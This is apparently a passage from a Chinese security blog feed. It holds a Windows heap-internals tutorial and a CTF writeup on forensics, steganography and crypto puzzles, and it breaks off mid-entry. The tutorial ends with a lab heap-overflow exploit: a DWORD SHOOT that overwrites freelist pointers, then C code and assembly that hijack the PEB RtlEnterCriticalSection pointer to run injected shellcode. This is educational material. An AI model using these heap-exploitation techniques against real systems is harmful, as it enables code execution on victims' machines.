freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line">	</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">// coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>调试过程：<br>（1）在 VC6.0 中设置 build 为 Release 版本，并在 OllyDbg 中 “Options” 菜单中选中 “Just-in-time debugging”，单击 “Make OllyDbg just-in-time debugger”，然后单击 “Done” 按钮确认。<br>（2）运行上面程序之后，在系统出现错误提示的时候，选择“取消”，将会进入OD进行调试：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509145430666.png" alt="在这里插入图片描述"><br>（3）使用Alt+M可以查看当前内存映射状态，一般来说，进程中会存在若干堆区，如下：</p>
<ul>
<li>为测试进程包含的一个始于0x00130000大小为0x6000的进程堆，可以通过GetProcessHeap()获得这个堆的句柄。</li>
<li>为malloc创建的堆。</li>
<li>为我们代码中创建的堆。<br><img src="/2020/05/13/0daySec-HeapDebug/20200509150319176.png" alt="在这里插入图片描述"></li>
</ul>
<p><br></p>
<h3 id="0x02-识别堆表"><a href="#0x02-识别堆表" class="headerlink" title="0x02 识别堆表"></a>0x02 识别堆表</h3><p>在程序初始化过程中，malloc 使用的堆和进程堆都已经经过了若干次分配和释放操作，里边的堆块相对比较“凌乱”。因此，我们在程序中使用 HeapCreate() 函数创建一个新的堆进行分析。<br>HeapCreate()成功地创建了堆区之后，会把整个堆区的起始地址返回给 EAX，这里是0x00360000：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509150845178.png" alt="在这里插入图片描述"><br>通过 Ctrl+G 到 0x00360000 的内存中进行查看， 从 0x00360000 开始，堆表中包含的信息依次是段表索引（Segment List）、虚表索引（Virtual Allocation list）、空表使用标识（freelist usage bitmap）和空表索引区。</p>
<p>我们主要观察偏移 0x178 处的空表索引区，偏移0x00360178即为是空表的头。<br>可以看到：</p>
<ul>
<li>freelist[0] 指向目前堆中唯一的一个尾块（0x00360688），共八个字节（前四个字节是前向指针，后四个字节是后向指针）。</li>
<li>除零号空表索引外，其余各项索引都指向自己，说明这些空闲链表都为空。<br><img src="/2020/05/13/0daySec-HeapDebug/20200509151850157.png" alt="在这里插入图片描述"><br>可以看到块尾（0x00360688）的指针同样是指向 freelist[0] 的（0x00360178）：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509155734209.png" alt="在这里插入图片描述"><br>块首的具体含义可借鉴下图：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509155549685.png" alt="在这里插入图片描述"><br><br></li>
</ul>
<h3 id="0x03-堆块的分配"><a href="#0x03-堆块的分配" class="headerlink" title="0x03 堆块的分配"></a>0x03 堆块的分配</h3><p>堆块的分配细节如下：</p>
<ul>
<li>堆块大小包含块首，故，如果申请32字节，那么实际被认为申请的是40字节（8字节块首＋32 字节块身）</li>
<li>堆块的单位是8字节，不足8字节将按8字节分配</li>
<li>初始状态下，快表和空表为空，不存在精确分配。所以将使用次优块分配，即尾块</li>
<li>由于次优分配，尾块会被陆续切走一些小块，它的块首中的 size 信息会改变，并且 freelist[0] 会指向新的尾块位置</li>
</ul>
<p>所以对于我们程序中的前 6 次连续的内存请求，实际分配情况如下：</p>
<table>
<thead>
<tr>
<th>堆句柄</th>
<th>请求字节数</th>
<th>实际分配（堆单位）</th>
<th>实际分配（字节）</th>
</tr>
</thead>
<tbody>
<tr>
<td>H1</td>
<td>3</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H2</td>
<td>5</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H3</td>
<td>6</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H4</td>
<td>8</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H5</td>
<td>19</td>
<td>4</td>
<td>32</td>
</tr>
<tr>
<td>H6</td>
<td>24</td>
<td>4</td>
<td>32</td>
</tr>
</tbody>
</table>
<p>在CPU窗口，命令F8单步执行程序到地址：0x0040102B处，这时我们执行完了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>当h1被分配以后直接查看freelist[0]（0x00360178），发现指向的地址由0x00360688变成了0x00360698：</p>
<p><img src="/2020/05/13/0daySec-HeapDebug/20200509154034635.png" alt="在这里插入图片描述"><br>接着查看0x00360698：<br><img src="/2020/05/13/0daySec-HeapDebug/2020050915501049.png" alt="在这里插入图片描述"><br>从图中可以看出：分配给h1的大小为0x0002, size=16bytes</p>
<p>继续单步运行到地址0x00401059，将h1~h6全部分配完，此时查看0x00360178指向了0x00360708:<br><img src="/2020/05/13/0daySec-HeapDebug/20200509155310317.png" alt="在这里插入图片描述"><br>查看0x00360708：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509155430679.png" alt="在这里插入图片描述"><br>可以发现，如今的尾块长度为0x0120个堆单位。一开始时为0x0130个堆单位，差值为16个堆单位，这恰恰是前六次分配出去的内存之和。</p>
<p>根据最后一次调用HeapAlloc后EAX中返回的指针，我们可以找到最后一次分配的内存位置：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509155846677.png" alt="在这里插入图片描述"><br>然后再往前搜索，可以发现前5次的分配。在下图中，我们用前6个红框标出了6次分配所得堆块的块首：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509160330717.png" alt="在这里插入图片描述"><br>可以看到实际分配的堆单位符合表中的2、2、2、2、4、4。第7个红框标出的是新的尾块的块首，即尾块不断向后移动。</p>
<p><br></p>
<h3 id="0x04-堆块的释放"><a href="#0x04-堆块的释放" class="headerlink" title="0x04 堆块的释放"></a>0x04 堆块的释放</h3><p>单步运行至0x00401077处，此时释放了堆块 h1、h3、h5。<br><img src="/2020/05/13/0daySec-HeapDebug/20200509162647422.png" alt="在这里插入图片描述"><br>可知：h1、h3分别被释放到 freelist[2] 空表中， h5被释放到了freelist[4]空表中。此时freelistp[2]的前向指针指向关系为：0x00360688→0x00360A88→0x00360188，其他类似。</p>
<p><img src="/2020/05/13/0daySec-HeapDebug/20200509162921827.png" alt="在这里插入图片描述"><br>由于这三次释放的堆块在内存中不连续，所以不会发生合并。到目前为止，有三个空闲链表上有空闲块，分别是freelist[0]、freelist[2]、freelist[4]。</p>
<p><br></p>
<h3 id="0x05-堆块的合并"><a href="#0x05-堆块的合并" class="headerlink" title="0x05 堆块的合并"></a>0x05 堆块的合并</h3><p>继续将程序运行到 0x401080地址处，即执行了如下代码：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h4);</span><br></pre></td></tr></table></figure></p>
<p>当释放h4的时候由于出现了两个连续的空闲块，所以会发生堆块的合并现象。h3、h4、h5彼此相邻，它们合并后是8个堆单位，所以将被链入freelist[8]。<br><img src="/2020/05/13/0daySec-HeapDebug/20200509165043968.png" alt="在这里插入图片描述"><br>可以看到原来链接着h1、h3的Freelist[2]现在只剩h1(0x00360688)，而Freelist[8]则链接了合并过后的新块（0x003606A8）。</p>
<p>我们来看0x003606A8，可以看到合并后的新块大小已经被修改为 0x0008，其空表指针指向 0x005201B8，也就是 freelist[8]的地址。<br><img src="/2020/05/13/0daySec-HeapDebug/2020050916533239.png" alt="在这里插入图片描述"><br><br></p>
<h3 id="0x06-快表的使用"><a href="#0x06-快表的使用" class="headerlink" title="0x06 快表的使用"></a>0x06 快表的使用</h3><p>调试代码如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HLOCAL h1,h2,h3,h4;</span><br><span class="line">    HANDLE hp;</span><br><span class="line">    hp = HeapCreate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    __asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">8</span>);</span><br><span class="line">    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">8</span>);</span><br><span class="line">    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br><span class="line">    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    HeapFree(hp, <span class="number">0</span>, h1);</span><br><span class="line">    HeapFree(hp, <span class="number">0</span>, h2);</span><br><span class="line">    HeapFree(hp, <span class="number">0</span>, h3);</span><br><span class="line">    HeapFree(hp, <span class="number">0</span>, h4);</span><br><span class="line"></span><br><span class="line">    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br><span class="line">    HeapFree(hp, <span class="number">0</span>, h2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>同样的方式用OD进行调试，查看 0x00360178 内存地址：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509171708944.png" alt="在这里插入图片描述"><br>可以发现，freelist[0] 中的尾块的位置不在 0x00360688 了，那个位置被快表占据。</p>
<p>去 0x00360688 看一下当前的快表，可以看到堆刚初始化后快表是空的：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509171940704.png" alt="在这里插入图片描述"></p>
<p>下面，首先从FreeList[0]中依次申请8、8、16、24字节的内存，然后进行释放到快表中（快表未满时优先释放到快表中）。根据三个堆块的大小我们可以知道8字节的会被释放到Lookaside[1]中、16字节的会被释放到Lookaside[2]中、24字节的会被释放到Lookaside[3]中。</p>
<p>接下来我们把程序运行到第四次释放之后。我们释放的空间依次是（包含块首）16、16、24、32，由于快表此时未满，所以它们被插入快表中，分别插在lookaside[1]、[2]、[3]中，如下：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509193537985.png" alt="在这里插入图片描述"><br>链在快表中的堆块块首的Flag值为0x01，即Busy。<br><img src="/2020/05/13/0daySec-HeapDebug/20200509194024850.png" alt="在这里插入图片描述"><br>继续将断点下在下面这行代码之后：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br></pre></td></tr></table></figure></p>
<p>由于h2的再次被申请，而优先从快表中分配，所以lookaside[2]会再次变为空，如下：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509194344395.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h3 id="0x07-堆溢出利用之DWORD-SHOOT"><a href="#0x07-堆溢出利用之DWORD-SHOOT" class="headerlink" title="0x07 堆溢出利用之DWORD SHOOT"></a>0x07 堆溢出利用之DWORD SHOOT</h3><p>调试代码：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	HLOCAL h1, h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	_asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// free the odd blocks to prevent coalesing</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); </span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); </span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">// now freelist[2] got 3 entries</span></span><br><span class="line">	<span class="comment">// will allocate from freelist[2] which means unlink the last entry (h5)</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>); </span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>上述代码中申请六次空间，然后释放三次，把奇数次申请的空间释放掉（避免堆块合并），此时freelist[2]中应该链入了三个空闲堆块h1、h3、h5。<br>在此之后，倒数第二行代码再次申请空间，会导致freelist[2]的最后一个堆块（即之前的h5）被卸下。如果我们在调用申请函数的汇编指令之前把h5的前后指针按照前面所描述的方式修改掉，就会出现“DWORD SHOOT”。</p>
<p>我们将断点下载执行完六次申请、三次释放后，即将执行最后一次申请前调试状态如下：<br>Freelist[2]前向指针指向0x00360688（即h1）<br><img src="/2020/05/13/0daySec-HeapDebug/2020050920352825.png" alt="在这里插入图片描述"><br>继续查看0x00360688，如下<br><img src="/2020/05/13/0daySec-HeapDebug/2020050920374463.png" alt="在这里插入图片描述"><br>此时EBP的值为：0x0012FF80<br><img src="/2020/05/13/0daySec-HeapDebug/20200509205020247.png" alt="在这里插入图片描述"><br>下面我们的目标是通过 DWORD SHOOT 向EBP所指的栈帧位置写入 0x77777777，我们选中内存区域中 0x003606C8 对应的部分，按空格，将 flink 修改为 payload，将 blink 修改为目标地址，如下：</p>
<p><img src="/2020/05/13/0daySec-HeapDebug/20200509205346445.png" alt="在这里插入图片描述">然后将程序继续运行，查看栈帧中 0x0012FF80 的位置，发现已经被成功覆盖为了 0x77777777:<br><img src="/2020/05/13/0daySec-HeapDebug/20200509205748625.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h3 id="0x08-堆溢出利用之代码植入"><a href="#0x08-堆溢出利用之代码植入" class="headerlink" title="0x08 堆溢出利用之代码植入"></a>0x08 堆溢出利用之代码植入</h3><p>以0x7FFDF024处的RtlEnterCriticalSection()指针为目标，练习一下DWORDSHOOT 后，劫持进程、植入代码的全套动作。</p>
<p>首先是正常的调试代码如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//200Bytes 0x90</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span> <span class="comment">//used to break the process</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">200</span>); <span class="comment">//normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,0x200); //overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行后在可以看到尾块的地址为0x00360758<br><img src="/2020/05/13/0daySec-HeapDebug/20200509212857272.png" alt="在这里插入图片描述"><br>继续执行memcpy后，我们观察0x00360688处开始的数据：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509213402489.png" alt="在这里插入图片描述"><br>可以看到在200个0x90后正好是尾块块首的开始。所以一旦 shellcode 超过200字节，就将覆盖尾块块首。那么当h2再次申请空间时，就会导致 DWORD SHOOT。</p>
<p>下面我们就需要构造相应的 payload，需要注意的点如下：</p>
<ul>
<li>把前200个字节用真正的弹窗 shellcode 填充。</li>
<li>紧随其后，附上 8 字节的块首信息。为了防止在 DWORD SHOOT 发生之前产生异常，直接将块首从内存中复制使用：“\x16\x01\x1A\x00\x00\x10\x00\x00”。</li>
<li>把尾块的flink覆盖为0x00360688，即shellcode的起始地址。</li>
<li>把尾块的后指针覆盖为0x7FFDF020，即P.E.B 中的RtlEnterCriticalSection()函数指针地址。</li>
</ul>
<p>还有一个需要注意的地方是由于shellcode中的函数也要使用到被我们后面修改的PEB中的函数指针，所以我们在shellcode的开头需要修复一下函数指针：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax, 7ffdf020</span><br><span class="line">mov ebx, 77f82060</span><br><span class="line">mov [eax], ebx</span><br></pre></td></tr></table></figure></p>
<p>最终构造的shellcode组成如下：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509220000363.png" alt="在这里插入图片描述"></p>
<p>造成溢出的利用代码如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line">	<span class="comment">//__asm int 3 //used to break the process</span></span><br><span class="line">	<span class="comment">//memcpy(h1,shellcode,200); //normal cpy, used to watch the heap</span></span><br><span class="line">	<span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>); <span class="comment">//overflow,0x200=512</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行后，可以看到成功执行了 shellcode：<br><img src="/2020/05/13/0daySec-HeapDebug/20200509220453561.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title>领航杯部分Writeup</title>
    <url>/2019/11/25/LHB-Writeup/</url>
    <content><![CDATA[<h1 id="编码解码"><a href="#编码解码" class="headerlink" title="编码解码"></a>编码解码</h1><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">V2VsY29tZXRvdGhlUGlsb3RDdXA</span>=</span><br></pre></td></tr></table></figure>
<p>签到题，base64解码一下得到：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">WelcometothePilotCup</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h1 id="取证分析"><a href="#取证分析" class="headerlink" title="取证分析"></a>取证分析</h1><p>给了一个pacp.pcap，CTF Wiki里面收录过这一道例题…</p>
<p>wireshark 打开发现全部为DNS协议,查询名为大量字符串<code>xxxxx.skullseclabs.org</code></p>
<p>好像是BSides San Francisco CTF 2017原题，参考这篇文章：<a href="https://volatilevirus.home.blog/2018/12/30/bsidessf17-ctf-dnscap-write-up/" target="_blank" rel="noopener">https://volatilevirus.home.blog/2018/12/30/bsidessf17-ctf-dnscap-write-up/</a></p>
<p>先用下面命令进行提取：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">tshark -r pacp<span class="selector-class">.pcap</span> -T fields -e dns<span class="selector-class">.qry</span><span class="selector-class">.name</span> &gt; hex</span><br></pre></td></tr></table></figure>
<p>然后用如下脚本得到flag.png:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">                                                 r = rdpcap(<span class="string">"pacp.pcap"</span>)</span><br><span class="line"> </span><br><span class="line">a = <span class="string">""</span></span><br><span class="line"> </span><br><span class="line">b = <span class="string">""</span></span><br><span class="line">c = <span class="string">""</span></span><br><span class="line">new = <span class="string">""</span></span><br><span class="line"> </span><br><span class="line">f = open(<span class="string">"flag.png"</span>,<span class="string">"w"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">0</span>,len(r)):</span><br><span class="line">    <span class="keyword">if</span> r[i].haslayer(DNSQR) <span class="keyword">and</span> <span class="keyword">not</span> r[i].haslayer(DNSRR):</span><br><span class="line">        a = r[i][DNSQR].qname</span><br><span class="line">        b = a.replace(<span class="string">".skullseclabs.org."</span>,<span class="string">""</span>)</span><br><span class="line">        b = b.replace(<span class="string">"."</span>,<span class="string">""</span>).decode(<span class="string">"hex"</span>)[<span class="number">9</span>:]</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> b == c:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line">        c = b</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="number">6</span> &lt; i &lt;<span class="number">365</span>:</span><br><span class="line">            new = new + b</span><br><span class="line"> </span><br><span class="line">f.write(new)</span><br><span class="line"> </span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>直接打不开，用010 Editor看一下：<br><img src="/2019/11/25/LHB-Writeup/20191122191914979.png" alt="在这里插入图片描述"><br>删掉上面选中的部分，再打开，得到flag：b91011fc<img src="/2019/11/25/LHB-Writeup/201911221919373.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h1><p>给了下面这张图片：<br><img src="/2019/11/25/LHB-Writeup/20191122192053275.png" alt="在这里插入图片描述"></p>
<p>根据题目名字lsb，用Stegsolve打开，移位到下面位置得到flag：ONPGRAMBCICM<br><img src="/2019/11/25/LHB-Writeup/20191122192250933.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="恢复与解密"><a href="#恢复与解密" class="headerlink" title="恢复与解密"></a>恢复与解密</h1><p>题目描述：公安人员在犯罪分子的电脑中发现一些磁盘文件，但是发现关键信息已经被删除，现需要你对磁盘进行恢复，并对恢复出来的一些秘密文件里面的加密信息进行解密。 注意：通过strings获取到的yc4pl0fvjs2k1t7T为假flag，请尝试使用其他正确的做题方式获取flag。</p>
<p>所以可以判断这题为磁盘恢复，并且有假flag。</p>
<p>附件给的是一个xty.img，在kali下面命令进行挂载：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount -o loop xty.img /mnt</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/11/25/LHB-Writeup/20191122192641539.png" alt="在这里插入图片描述"></p>
<p>发一下一个隐藏文件夹<code>.hide</code>，里面有一个<code>secret.odg</code>，打开得到如下内容：<br><img src="/2019/11/25/LHB-Writeup/20191122192752446.png" alt="在这里插入图片描述"><br>好像没什么用，想到题目描述中的磁盘恢复，所以需要用到sstat 和 ext3grep这两个工具，先用下面命令查看相关信息：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">fsstat</span> <span class="selector-tag">xty</span><span class="selector-class">.img</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/11/25/LHB-Writeup/20191122193022786.png" alt="在这里插入图片描述"><br>注意这里<code>Root Directory: 2</code>中的2是我们要用到的。</p>
<p>再用ext3grep工具，查看目录如下：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">ext3grep <span class="comment">--inode 2 xty.img</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/11/25/LHB-Writeup/201911221933068.png" alt="在这里插入图片描述"><br>可以看到很多secret文件，实际上内容都一样，用下面命令将其恢复出来：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">ext3grep --restore-file<span class="built_in"> secret </span>xty.img</span><br></pre></td></tr></table></figure>
<p><img src="/2019/11/25/LHB-Writeup/20191122193728451.png" alt="在这里插入图片描述"><br>打开该文件发现下面一串字符：<br><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">aWdx<span class="symbol">NDs3</span><span class="symbol">NDFSOzFpa1</span>I<span class="number">1</span>MWliT<span class="number">08</span>waWdx</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/11/25/LHB-Writeup/20191122193818373.png" alt="在这里插入图片描述"></p>
<p>base64一下得到：<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">igq4;<span class="number">741</span>R;<span class="number">1</span>ikR51ibOO0igq</span><br></pre></td></tr></table></figure></p>
<p>异或解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">c = <span class="string">"igq4;741R;1ikR51ibOO0igq"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    p = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(c)):</span><br><span class="line">        p += chr(ord(c[j])^i)</span><br><span class="line">    <span class="keyword">print</span> (p)</span><br></pre></td></tr></table></figure>
<p>得到的唯一一个无特殊字符的即为flag：jdr78472Q82jhQ62jaLL3jdr<img src="/2019/11/25/LHB-Writeup/20191122194428814.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="文件提取"><a href="#文件提取" class="headerlink" title="文件提取"></a>文件提取</h1><p>给了一个flag.exe，strings一下可以看到是图片转base64后的字符串：<br><img src="/2019/11/25/LHB-Writeup/20191122195004615.png" alt="在这里插入图片描述"><br>随便找个在线网站转回图片如下：</p>
<p><img src="/2019/11/25/LHB-Writeup/20191122195200384.png" alt="在这里插入图片描述"><br>然后strings一下这个图片得到flag：flag{068EEF6A7BAD3FDF}<br><img src="/2019/11/25/LHB-Writeup/20191122195251726.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h1><p>给了一个pngdecode.docx：<br><img src="/2019/11/25/LHB-Writeup/20191122195431580.png" alt="在这里插入图片描述"></p>
<p>一开始分析了好久这个图片，但是无果…然后对整个docx文档foremost提取一下，得到flag：360HA360<br><img src="/2019/11/25/LHB-Writeup/20191122195959283.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="OldCypher-Easy"><a href="#OldCypher-Easy" class="headerlink" title="OldCypher-Easy"></a>OldCypher-Easy</h1><p>给了密文如下：<br><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">Vvr Ifnvaus <span class="keyword">Bdwokv </span>Gbtrzsa Vkqgofntja rrlznxk eflvkozjcdue rs “mzg oez ff pjkhvtx ok kqzioeg vgfsf.” Zyil au vvykokaeoyrp avuwfnzv, <span class="keyword">bnl </span>fcry eom ucdgaie mzg qhxiegl dfrguta gh huk wixdf ce oks ijggrtk-dtq uqvketbxkq sulnwsvwbtj. Taw fssoeimaqb sutulwu gbrvlr <span class="built_in">gp</span> huk towwu hugk htng prke ulwf tbx teglwfvkj th wpoorv sxutsg ifmfmpwpgkihf. <span class="keyword">Dig </span>iiyilquegghr fqknjryl wpqbsgalkgg zath fgts gnrn mzkg: vz uetdu kvzy mxujoaojml xqf rtjukapu vtkezjkhl, zvcafkehkj fhj glpnrnzapu fktrxl msly, grhlqqbrj fhj cignvnmaeogoeg nkgff, kcevltcaot anuvwbtj agv gzrikihfu, rvmzttd eofn, rnw eqfr. Cztagwh nzkefhvwam ko ijqjvjv a vgodykke vzcfnikekabogofn, pw ychru stq vvnz dowwtb pxppmgifnvyy <span class="keyword">bfxcybvs </span>mzg ggauy hx oognvmtlkqnr kevzpwdavs ygt grilrbfi rvmzttd kbsuimtlkca, ypsmwog, ntu dbkvfvhltxv eczvlttlkcay rgtapgg guvxjuoeorl tlvopqj. fesi&#123;<span class="number">42</span>s96q9hw73d79v4xf5308t18o8519is10c512u2&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后一串明显像flag的格式，在这个网站进行维吉尼亚解密：<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p>
<p>得到flag：flag{42e96d9bf73d79c4fd5308f18b8519cb10c512b2}<br><img src="/2019/11/25/LHB-Writeup/20191122200254756.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="MasterofZip-Middle"><a href="#MasterofZip-Middle" class="headerlink" title="MasterofZip-Middle"></a>MasterofZip-Middle</h1><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>给了一个压缩包，和一个Readme.md内容如下：</p>
